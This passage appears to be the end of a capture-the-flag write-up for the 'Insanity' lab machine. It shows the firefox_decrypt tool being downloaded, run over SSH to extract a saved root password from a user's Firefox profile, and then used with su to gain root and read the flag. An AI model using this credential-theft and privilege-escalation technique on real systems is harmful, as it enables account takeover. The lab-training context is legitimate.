-  wget [https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip](#https://github.com/unode/firefox_decrypt/archive/refs/tags/0.7.0.zip)

-  send firefox\_decrypt to target machine
**
in SSH**
-  \[elliot@insanityhosting firefox\]$ python firefox\_decrypt\.py 
Select the Firefox profile you wish to decrypt
1 \-\> wqqe31s0\.default
2 \-\> esmhp32w\.default\-default
2

Master Password for profile /home/elliot/\.mozilla/firefox/esmhp32w\.default\-default: 
2024\-02\-09 02:02:02,184 \- WARNING \- Attempting decryption with no Master Password

Website:   [https://localhost:10000](#https://localhost:10000)

Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
\[elliot@insanityhosting firefox\]$ su root
Password: 
\[root@insanityhosting firefox\]# id
uid=0\(root\) gid=0\(root\) groups=0\(root\)
\[root@insanityhosting firefox\]# cat flag\.txt 
\_\_\_\_                       \_ \_\_       
/  \_/\_\_\_  \_\_\_\_\_\_\_\_\_ \_\_\_\_\_  \(\_\) /\_\_\_  \_\_
/ // \_\_ \\/ \_\_\_/ \_\_ \`/ \_\_ \\/ / \_\_/ / / /
\_/ // / / \(\_\_  \) /\_/ / / / / / /\_/ /\_/ / 
/\_\_\_/\_/ /\_/\_\_\_\_/\\\_\_,\_/\_/ /\_/\_/\\\_\_/\\\_\_, /  
/\_\_\_\_/   

Well done for completing Insanity\. I want to know how difficult you found this \- let me know on my blog here: https://security\.caerdydd\.wales/insanity\-ctf/

